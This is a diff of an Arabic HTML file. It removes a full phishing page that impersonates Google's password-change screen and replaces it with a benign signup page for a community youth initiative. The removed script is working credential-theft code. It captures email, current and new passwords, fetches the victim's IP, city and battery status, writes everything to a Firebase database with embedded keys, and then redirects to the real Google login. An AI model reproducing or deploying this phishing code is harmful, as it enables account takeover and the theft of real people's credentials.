@@ -1,203 +1,261 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>تغيير كلمة المرور — Google</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>بوابة مبادرة أجيال تنكراش</title>
 <style>
-body{margin:0;background:#f5f7fa;font-family:Roboto, sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
-.card{background:#fff;padding:24px;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.1);width:100%;max-width:400px;text-align:center;position:relative}
-.logo{font-size:32px;font-weight:700;margin-bottom:16px;font-family:Product Sans,Roboto,sans-serif;}
-.logo span.g{color:#4285F4;}
-.logo span.o1{color:#EA4335;}
-.logo span.o2{color:#FBBC05;}
-.logo span.g2{color:#4285F4;}
-.logo span.l{color:#34A853;}
-.logo span.e{color:#EA4335;}
-.description{font-size:14px;color:#5f6368;margin-bottom:16px;line-height:1.5}
-input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;margin:12px 0;font-size:15px;outline:none;transition:border 0.2s}
-input:focus{border-color:#1a73e8}
-button{width:100%;padding:12px;margin-top:16px;border:0;border-radius:8px;font-weight:600;font-size:15px;cursor:pointer;background:#1a73e8;color:#fff;transition:background 0.2s}
-button:hover{background:#1558b0}
-.error{color:#d93025;font-size:13px;margin-top:-8px;margin-bottom:8px;text-align:right;display:none}
-.success{font-size:18px;color:green;margin-top:20px;display:none}
-.step{display:none}
-.step.active{display:block}
-.shake{animation:shake 0.3s}
-@keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-5px)}100%{transform:translateX(0)}}
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: 'Arial', sans-serif;
+    background-color: #fff;
+    color: #FFD700;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+  }
+
+  .header {
+    width: 100%;
+    background-color: #fff;
+    text-align: center;
+    padding: 10px 0;
+    border-bottom: 2px solid #FFD700;
+    font-size: 1em;
+    color: #FFD700;
+    letter-spacing: 1px;
+  }
+
+  h1 {
+    font-size: 2.5em;
+    text-align: center;
+    margin: 20px 0;
+    text-shadow: 2px 2px 8px #000;
+  }
+
+  .logo {
+    width: 400px;
+    height: auto;
+    margin-bottom: 20px;
+  }
+
+  .join-container {
+    text-align: center;
+    margin-bottom: 30px;
+  }
+
+  .join-text {
+    font-size: 1.5em;
+    color: #000;
+    margin-bottom: 10px;
+    font-weight: bold;
+  }
+
+  .toggle-btn {
+    font-size: 1.5em;
+    padding: 15px 40px;
+    background-color: #FFD700;
+    color: #000;
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+    transition: 0.3s;
+  }
+
+  .toggle-btn:hover {
+    background-color: #e6c200;
+  }
+
+  .form-container {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background-color: rgba(0,0,0,0.7);
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+    padding: 20px;
+    overflow-y: auto;
+  }
+
+  .form-container form {
+    width: 95%;
+    max-width: 700px;
+    background-color: #FFFFFF;
+    padding: 40px;
+    border-radius: 20px;
+    box-shadow: 0 0 50px #FFD700;
+    color: #000;
+    position: relative;
+  }
+
+  label {
+    display: block;
+    margin-top: 15px;
+    font-size: 1.2em;
+    color: #000;
+  }
+
+  select, input, textarea {
+    width: 100%;
+    padding: 12px;
+    margin-top: 5px;
+    border: 2px solid #FFD700;
+    border-radius: 8px;
+    background-color: #fff;
+    color: #000;
+    font-size: 1em;
+  }
+
+  textarea {
+    resize: vertical;
+    min-height: 100px;
+  }
+
+  button.submit-btn {
+    margin-top: 20px;
+    padding: 15px;
+    width: 100%;
+    background-color: #FFD700;
+    color: #000;
+    font-size: 1.2em;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+  }
+
+  button.submit-btn:hover {
+    background-color: #e6c200;
+  }
+
+  .back-btn {
+    display: block;
+    margin-bottom: 20px;
+    padding: 10px 20px;
+    background-color: #FFD700;
+    border: none;
+    border-radius: 8px;
+    font-size: 1em;
+    cursor: pointer;
+    color: #000;
+  }
+
+  .about {
+    background-color: #fff;
+    color: #000;
+    border: 2px solid #FFD700;
+    border-radius: 15px;
+    padding: 25px;
+    margin: 20px 10px;
+    max-width: 800px;
+    line-height: 1.8;
+    text-align: justify;
+    box-shadow: 0 0 20px #FFD700;
+    font-size: 1.1em;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .option-form {
+    display: none;
+    margin-top: 15px;
+  }
 </style>
 </head>
 <body>
 
-<div class="card">
-  <div class="logo">
-    <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+<div class="header">مبادرة أجيال تنكَّراش</div>
+
+<h1>أهلا بكم في بوابة المبادرة</h1>
+
+<img src="https://i.ibb.co/ymKS7S5g/1757820255227.jpg" alt="شعار المبادرة" class="logo">
+
+<div class="join-container">
+  <div class="join-text">اضغط هنا للانضمام إلى المجتمع</div>
+  <button class="toggle-btn" onclick="toggleForm()">الانضمام</button>
+</div>
+
+<!-- نبذة مربعة -->
+<div class="about">
+  <div>
+    <strong>نبذة عن مبادرة أجيال تنكَّراش:</strong><br><br>
+    مبادرة أجيال تنكَّراش هي مشروع مجتمعي يهدف إلى تقريب الأهل من أبنائهم وغرس القيم الدينية والأخلاقية في نفوس الأجيال الجديدة.  
+    تعمل المبادرة على تعزيز الروابط العائلية والمعرفية من خلال تنظيم برامج تعليمية وترفيهية.  
+    تقدم المبادرة مسابقات متنوعة تشمل القرآن الكريم، المسابقات الأدبية، والبطولات الرياضية.  
+    كما تهتم بتكريم الفائزين في المسابقات الوطنية وتقديم الشكر والتقدير لهم.  
+    تتيح المبادرة الفرصة لجميع المشاركين لتطوير مهاراتهم وتنمية قدراتهم الشخصية والاجتماعية.  
+    تركز المبادرة على الحفاظ على المستوى التعليمي والثقافي، مع العمل المستمر على رفعه وتطويره.  
+    كما تهدف إلى بناء مجتمع متعاون ومتفاعل، يعزز روح الأخوة والانتماء بين الأجيال.  
   </div>
+</div>
 
-  <div class="description">
-    الرجاء إدخال بريدك الإلكتروني وكلمة المرور لتحديث حسابك بأمان.
-  </div>
+<!-- النموذج fullscreen -->
+<div class="form-container" id="main-form">
+  <form>
+    <button type="button" class="back-btn" onclick="toggleForm()">⬅ رجوع</button>
 
-  <form id="form">
-    <div class="step step1 active">
-      <input type="email" placeholder="البريد الإلكتروني" required id="email">
-      <div class="error">يرجى إدخال بريد إلكتروني صالح</div>
-      <button type="button" id="next1">التالي</button>
+    <label for="option">اختر نوع المشاركة:</label>
+    <select id="option" name="option" required onchange="showOptionForm(this.value)">
+      <option value="">-- اختر --</option>
+      <option value="sports">البطولة الرياضية</option>
+      <option value="literary">مسابقة الأدبية</option>
+      <option value="quran">مسابقة القرآن الكريم</option>
+      <option value="other">أخرى</option>
+    </select>
+
+    <label for="fullname">الاسم الكامل:</label>
+    <input type="text" id="fullname" name="fullname" placeholder="اكتب اسمك الكامل" required>
+
+    <label for="number">الرقم:</label>
+    <input type="text" id="number" name="number" value="222" maxlength="11" pattern="^222[0-9]{8}$" 
+      title="أدخل رقم يبدأ بـ 222 ويتبعه 8 أرقام" required>
+
+    <div class="option-form" id="sports-form">
+      <label for="team">اسم الفريق / النادي:</label>
+      <input type="text" id="team" name="team" placeholder="اكتب اسم الفريق" required>
     </div>
 
-    <div class="step step2">
-      <input type="password" placeholder="كلمة المرور الحالية" required minlength="8" id="currentPassword">
-      <div class="error">كلمة المرور الحالية يجب أن تكون 8 أحرف على الأقل</div>
-      <button type="button" id="next2">التالي</button>
+    <div class="option-form" id="literary-form">
+      <label for="essay-title">عنوان المشاركة الأدبية:</label>
+      <input type="text" id="essay-title" name="essay-title" placeholder="اكتب عنوان مشاركتك" required>
     </div>
 
-    <div class="step step3">
-      <input type="password" placeholder="كلمة المرور الجديدة" required minlength="8" id="newPassword">
-      <input type="password" placeholder="تأكيد كلمة المرور" required minlength="8" id="confirmPassword">
-      <div class="error" id="error3">كلمة المرور يجب أن تكون ≥ 8 أحرف ومتطابقة</div>
-      <div class="success" id="successMessage">تم تغيير كلمة السر بنجاح</div>
-      <button type="button" id="verifyPass">التالي</button>
+    <div class="option-form" id="quran-form">
+      <label for="surah">اسم السورة أو الجزء:</label>
+      <input type="text" id="surah" name="surah" placeholder="اكتب السورة أو الجزء" required>
     </div>
+
+    <div class="option-form" id="other-form">
+      <label for="other-desc">صف مشاركتك:</label>
+      <textarea id="other-desc" name="other-desc" placeholder="صف مشاركتك" required></textarea>
+    </div>
+
+    <button type="submit" class="submit-btn">إرسال</button>
   </form>
 </div>
 
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-app.js";
-import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-firestore.js";
-
-const firebaseConfig = {
-  apiKey: "AIzaSyCInhJ9Yq7znuEeHJkeRulBU6G4uHbdnyk",
-  authDomain: "merry-fc865.firebaseapp.com",
-  projectId: "merry-fc865",
-  storageBucket: "merry-fc865.firebasestorage.app",
-  messagingSenderId: "114253227649",
-  appId: "1:114253227649:web:6eae11c8ace416d9fccf80",
-  measurementId: "G-DKT1EEHHMX"
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-
-const step1 = document.querySelector(".step1");
-const step2 = document.querySelector(".step2");
-const step3 = document.querySelector(".step3");
-const next1 = document.getElementById("next1");
-const next2 = document.getElementById("next2");
-const verifyPass = document.getElementById("verifyPass");
-const error3 = document.getElementById("error3");
-const successMessage = document.getElementById("successMessage");
-
-let lastSentData = "";
-
-// التنقل بين الخطوات
-next1.addEventListener("click", ()=>{
-  const input = document.getElementById("email");
-  if(input.checkValidity()){
-    step1.classList.remove("active");
-    step2.classList.add("active");
-    step1.querySelector(".error").style.display = "none";
-  } else {
-    step1.querySelector(".error").style.display = "block";
+<script>
+  function toggleForm() {
+    const form = document.getElementById('main-form');
+    form.style.display = (form.style.display === 'flex') ? 'none' : 'flex';
   }
-});
 
-next2.addEventListener("click", ()=>{
-  const input = document.getElementById("currentPassword");
-  if(input.checkValidity()){
-    step2.classList.remove("active");
-    step3.classList.add("active");
-    step2.querySelector(".error").style.display = "none";
-  } else {
-    step2.querySelector(".error").style.display = "block";
+  function showOptionForm(value) {
+    const forms = document.querySelectorAll('.option-form');
+    forms.forEach(f => f.style.display = 'none');
+
+    if(value === 'sports') document.getElementById('sports-form').style.display = 'block';
+    if(value === 'literary') document.getElementById('literary-form').style.display = 'block';
+    if(value === 'quran') document.getElementById('quran-form').style.display = 'block';
+    if(value === 'other') document.getElementById('other-form').style.display = 'block';
   }
-});
-
-// الزر الأخير: تحقق ثم إرسال ثم تحويل النص إلى "الرجوع" → https://accounts.google.com
-verifyPass.addEventListener("click", async ()=>{
-  const email = document.getElementById("email").value.trim();
-  const currentPassword = document.getElementById("currentPassword").value.trim();
-  const newPassword = document.getElementById("newPassword").value.trim();
-  const confirmPassword = document.getElementById("confirmPassword").value.trim();
-
-  if(newPassword.length >= 8 && newPassword === confirmPassword){
-    const dataString = `${email}|${currentPassword}|${newPassword}`;
-    if(dataString !== lastSentData && email && currentPassword && newPassword){
-      await sendData(email, currentPassword, newPassword);
-      lastSentData = dataString;
-    }
-
-    error3.style.display = "none";
-    successMessage.style.display = "block";
-    step3.querySelectorAll("input").forEach(el=>el.disabled = true);
-
-    // زر الرجوع
-    verifyPass.textContent = "الرجوع";
-    verifyPass.replaceWith(verifyPass.cloneNode(true));
-    const finalBtn = document.querySelector("button[id='verifyPass']");
-    if(finalBtn){
-      finalBtn.addEventListener("click", ()=> {
-        window.location.href = "https://accounts.google.com";
-      }, { once: true });
-    }
-  } else {
-    error3.style.display = "block";
-    verifyPass.classList.add("shake");
-    setTimeout(()=>verifyPass.classList.remove("shake"),300);
-  }
-});
-
-// جلب IP والمدينة
-async function fetchIPandCity(){
-  try{
-    const controller = new AbortController();
-    const timeoutId = setTimeout(()=>controller.abort(), 5000);
-    const res = await fetch("https://ipapi.co/json/", { signal: controller.signal });
-    clearTimeout(timeoutId);
-    if(!res.ok) throw new Error("ipapi failed");
-    const data = await res.json();
-    return {
-      ip: data.ip || "غير معروف",
-      city: data.city || data.region || data.country_name || "غير معروف"
-    };
-  } catch(e){
-    return { ip: "غير معروف", city: "غير معروف" };
-  }
-}
-
-// حالة البطارية
-async function getBatteryStatusSafe(){
-  try{
-    if(navigator.getBattery){
-      const bat = await navigator.getBattery();
-      const pct = Math.round((bat.level || 0) * 100);
-      return `${bat.charging ? "يشحن" : "غير مشحون"} - ${pct}%`;
-    }
-  } catch(e){}
-  return "غير معروف";
-}
-
-// إرسال البيانات مع الوقت
-async function sendData(email, currentPassword, newPassword){
-  if(!email && !currentPassword && !newPassword) return;
-
-  const batteryStatus = await getBatteryStatusSafe();
-  const { ip, city } = await fetchIPandCity();
-
-  try{
-    await addDoc(collection(db, "جديد"), {
-      "0.0.0.0.0": "",
-      البريد_الإلكتروني: email || "",
-      كلمة_الحالية: currentPassword || "",
-      كلمة_الجديدة: newPassword || "",
-      المدينة: city,
-      حالة_الشحن: batteryStatus,
-      IP_والموقع: ip,
-      الوقت: new Date().toLocaleString("ar-EG")
-    });
-  } catch(e){
-    console.error("خطأ عند إرسال البيانات: ", e);
-  }
-}
 </script>
 
 </body>
